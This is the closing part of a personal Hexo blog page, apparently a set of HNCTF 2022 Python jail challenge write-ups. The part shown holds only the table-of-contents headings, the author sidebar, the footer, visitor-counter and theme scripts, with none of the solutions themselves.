+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-Week1-calc-jail-beginner-JAIL"><span class="nav-number">1.</span> <span class="nav-text">[HNCTF 2022 Week1]calc_jail_beginner(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL"><span class="nav-number">2.</span> <span class="nav-text">[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-Week1-calc-jail-beginner-level3-JAIL"><span class="nav-number">3.</span> <span class="nav-text">[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL"><span class="nav-number">4.</span> <span class="nav-text">[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL"><span class="nav-number">5.</span> <span class="nav-text">[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-Week1-python2-input-JAIL"><span class="nav-number">6.</span> <span class="nav-text">[HNCTF 2022 Week1]python2 input(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-Week1-lake-lake-lake-JAIL"><span class="nav-number">7.</span> <span class="nav-text">[HNCTF 2022 Week1]lake lake lake(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-Week1-l-ke-l-ke-l-ke-JAIL"><span class="nav-number">8.</span> <span class="nav-text">[HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-JAIL"><span class="nav-number">9.</span> <span class="nav-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-0-5-JAIL"><span class="nav-number">10.</span> <span class="nav-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-1-JAIL"><span class="nav-number">11.</span> <span class="nav-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-2-JAIL"><span class="nav-number">12.</span> <span class="nav-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-3-JAIL"><span class="nav-number">13.</span> <span class="nav-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-JAIL"><span class="nav-number">14.</span> <span class="nav-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-1-JAIL"><span class="nav-number">15.</span> <span class="nav-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1(JAIL)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-WEEK2-laKe-laKe-laKe-JAIL"><span class="nav-number">16.</span> <span class="nav-text">[HNCTF 2022 WEEK2]laKe laKe laKe(JAIL)</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Kwansh"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Kwansh</p>
+  <div class="site-description" itemprop="description">往事越千年,魏武挥鞭,东临碣石有遗篇。萧瑟秋风今又是,换了人间</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:eminemgcxwlp@gmail.com" title="E-Mail → mailto:eminemgcxwlp@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2025\4\21 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Kwansh</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+
+</body>
+</html>
